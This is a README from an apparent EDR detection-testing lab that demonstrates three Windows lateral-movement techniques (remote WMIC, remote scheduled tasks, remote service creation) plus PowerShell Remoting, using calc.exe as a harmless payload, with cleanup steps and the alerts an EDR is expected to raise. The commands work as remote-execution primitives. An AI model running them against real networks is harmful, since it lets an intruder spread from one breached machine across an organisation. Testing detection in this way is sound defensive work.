# 13. Lateral Movement

[Portugues](../../13-movimento-lateral/README.md) | **English**

**MITRE ATT&CK tactic:** Lateral Movement and Execution
**IDs:** T1047, T1053.005, T1569.002, T1021
**Expected severity:** High
**Needs admin:** Yes, on the target
**Destructive:** Reversible

This folder shows three lateral movement techniques, all with native Windows tools. The script asks for a target and uses 127.0.0.1 as the default, to run in a contained way inside your own lab. In a real test, use a second lab machine as the target.

## What it is for, from the attacker point of view

After taking over the first machine, the attacker wants to spread across the network, hopping to other computers and servers until reaching what matters, for example the domain controller. Instead of installing tools, they use remote administration features that already exist in Windows.

## Why it is dangerous

Lateral movement is what turns the breach of a single computer into the compromise of the entire network. It is the difference between losing one machine and losing the company. Because it uses legitimate administration tools, it tends to blend in with the normal work of the IT team, which is why detecting it is so important.

## Analogy

The burglar came in through a window, but now grabs the building master keys and starts opening one door after another, walking the floors as if they were the caretaker.

## The three techniques shown

### Technique 1, remote WMIC (T1047)

Uses WMI, a Windows management service, to create a process on another machine.

```cmd
wmic /node:TARGET process call create "calc.exe"
```

### Technique 2, remote Scheduled Task (T1053.005)

Creates and triggers a scheduled task on another machine.

```cmd
schtasks /create /s TARGET /tn "LatMovTest" /tr "C:\Windows\System32\calc.exe" /sc once /st 23:59 /f
schtasks /run /s TARGET /tn "LatMovTest"
```

### Technique 3, remote service with sc (T1569.002)

Creates and starts a service on another machine, a PsExec style technique.

```cmd
sc \\TARGET create LatMovSvc binPath= "cmd.exe /c calc.exe" start= demand
sc \\TARGET start LatMovSvc
```

Bonus, PowerShell Remoting over WinRM, T1021.006.

```powershell
Invoke-Command -ComputerName TARGET -ScriptBlock { calc.exe }
```

## What the EDR should detect

* Remote process creation via WMI, wmic triggering a process on another machine.
* Remote creation or execution of a scheduled task.
* Remote service creation, a PsExec like pattern.
* Classification as Lateral Movement, high severity.

## Prerequisites

* Administrator on the source machine and on the target.
* The target reachable on the lab network. Use 127.0.0.1 for a contained test.

## Cleanup

```cmd
schtasks /delete /s TARGET /tn "LatMovTest" /f
sc \\TARGET delete LatMovSvc
```
